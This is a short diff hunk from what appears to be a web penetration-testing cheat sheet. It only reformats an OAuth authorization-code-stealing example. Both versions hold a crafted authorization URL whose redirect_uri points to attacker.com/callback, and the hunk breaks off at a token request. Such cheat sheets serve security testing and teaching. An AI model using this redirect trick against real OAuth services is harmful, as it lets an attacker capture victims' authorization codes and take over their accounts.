@@ -549,9 +549,9 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 Vulnerability Code Stealing
 
 -> Open Redirect (redirect_uri)
-  
-`https://site.com/authorization?client_id=<client_id>&redirect_uri=http://attacker.com/callback&response_type=code&scope=openid%20profile%20email`
-
+```
+https://site.com/authorization?client_id=%3Cclient_id%3E&redirect_uri=http://attacker.com/callback&response_type=code&scope=openid%20profile%20email
+```
 3-
 ```
 POST /token HTTP/1.1
